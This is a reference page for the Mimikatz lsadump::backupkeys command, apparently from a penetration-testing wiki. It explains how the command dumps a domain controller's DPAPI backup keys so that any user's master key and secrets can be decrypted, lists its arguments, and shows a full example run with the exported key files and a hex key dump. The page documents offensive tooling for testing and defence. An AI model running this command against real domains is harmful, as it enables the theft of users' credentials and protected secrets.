# backupkeys

`lsadump::backupkeys` dumps the DPAPI backup keys from the Domain Controller (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)). By holding the backup keys any user's master key can be decrypted and as a result the users' secrets can be decrypted. It has the following command line arguments:

* `/export`: export the output as `.pvk` which means "_private key_"
* `/secret`: _at the time of writing, November 1st 2021, we don't know what this option refers to_
* `/system`: the target DC hostname
* `/guid`: The `szGuid` value. It can be found at `C:\Users\<username>\AppData\Roaming\Microsoft\Credentials`, `C:\Users\<username>\AppData\Local\Microsoft\Credentials` and `C:\Users\<username>\AppData\Roaming\Microsoft\Protect\SID`. It can also be obtained with [sekurlsa::dpapi](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi)

{% hint style="warning" %}
This command requires elevated privileges (by previously running [privilege::debug](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # lsadump::backupkeys /export

Current prefered key:       {e3364acb-379c-4775-bef7-c3c1e1992589}
  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   :
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES
        Private export : OK - 'ntds_capi_0_e3364acb-379c-4775-bef7-c3c1e1992589.keyx.rsa.pvk'
        PFX container  : OK - 'ntds_capi_0_e3364acb-379c-4775-bef7-c3c1e1992589.pfx'
        Export         : OK - 'ntds_capi_0_e3364acb-379c-4775-bef7-c3c1e1992589.der'

Compatibility prefered key: {b799ff33-a573-444f-bc86-b8aeb36fcb3f}
  * Legacy key
561acf46e03db74112af7412402415d80dfe92b0fbf57588358647007d46f28f
8f6ca1990c0fee951bd52e69e9bdfbf9c8e07be0033dff21a71d192447668096
f6e1199e5b8b61fb3ffb758a92757efe863307cefd7d773476053286c08dc7c6
87671f0e7374ccc179e6cf718673beb80dfe12bf03c7914a767a959b66478498
14527ee085f014c7574d9b9388dae00f42ee91f96e97c8272d6955e51e2d7304
67be8b32a706203bacf3abaca3d9f1ec90e4d63290e39d2e6c2465fc0e195b7a
2baadcb281537863a37c2e0f76d025ecb7a23b81970dbe2ab8e77b3b2fb617d7
bb7b81126e17a60d3023b0b8db159dd927f49136ce14f29565d3d9794d2f9c79

        Export         : OK - 'ntds_legacy_0_b799ff33-a573-444f-bc86-b8aeb36fcb3f.key'
```
